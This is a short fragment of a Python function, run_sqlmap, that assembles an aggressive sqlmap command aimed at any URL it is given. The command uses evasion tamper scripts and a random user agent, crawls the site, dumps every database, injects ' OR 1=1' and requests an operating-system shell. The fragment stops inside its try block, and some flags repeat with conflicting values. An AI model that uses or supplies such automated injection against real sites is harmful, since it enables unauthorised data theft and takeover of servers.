...
def run_sqlmap(url):
    try:
        sqlmap_command = f"sqlmap -u {url} --batch --level=5 --risk=3 --tamper=space2comment,charencode,randomcase,between --random-agent --crawl=10 --threads=10 --technique=BEUSTQ --time-sec=10 --output-dir=sqlmap_output --dbs --dump-all --forms --smart --os-shell -p id --suffix=\" OR 1=1\" --fresh-queries --banner --is-dba --dump-all --current-user --hostname --fingerprint --threads=5"
